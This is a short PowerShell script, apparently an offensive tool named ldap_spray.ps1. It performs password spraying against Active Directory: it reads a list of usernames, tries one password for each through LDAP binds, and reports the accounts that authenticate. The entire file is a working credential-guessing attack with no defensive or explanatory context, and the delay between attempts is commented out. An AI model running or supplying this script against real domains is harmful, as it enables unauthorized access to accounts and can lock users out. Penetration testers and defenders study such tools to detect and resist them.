param ([string]$UserListPath, [string]$Password)

if (-not $UserListPath -or -not $Password) {
    Write-Host "`n [>] Usage: .\ldap_spray.ps1 <USERS FILE> <PASSWORD>"
    exit
}

$Users = Get-Content -Path $UserListPath

foreach ($User in $Users) {
    $User = $User.Trim()
    if ($User -eq "") { continue }
    #Write-Host "$User"
    $DomainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
    $LDAPPath = "LDAP://$DomainDN"

    try {
        $ADSI = New-Object DirectoryServices.DirectoryEntry($LDAPPath, $User, $Password)

        if ($ADSI.Name -ne $null) {
            Write-Host "[+] $User" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[-] Error - $User" -ForegroundColor Red
    }
    #Start-Sleep -Seconds 1
}

Write-Host "[*] Done!" -ForegroundColor Cyan
